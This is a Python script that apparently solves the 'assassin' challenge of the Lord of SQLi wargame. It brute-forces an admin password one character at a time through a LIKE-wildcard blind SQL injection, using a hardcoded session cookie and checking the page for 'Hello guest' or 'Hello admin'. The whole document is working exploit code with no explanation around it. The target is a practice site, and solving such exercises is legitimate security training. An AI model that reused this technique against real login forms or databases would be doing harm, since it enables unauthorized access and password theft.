import requests

password = '9'

while(True):
    for pw in range(ord('0'), ord('z')+1):
        URL = 'https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php'
        query = {'pw' : f"{password}{chr(pw)}%"}
        headers = {'Content-Type' : "application/json; charset=utf-8"}
        cookie = {'PHPSESSID' : 'l9g226ba80aorqek0gqubmcqn2'}
        res = requests.get(URL, params=query, headers=headers, cookies=cookie)
        if("Hello guest") in res.text:
            password += chr(pw)
            print(password)
            break
        elif("Hello admin") in res.text:
            password += chr(pw)
            print(f"value : {password}")
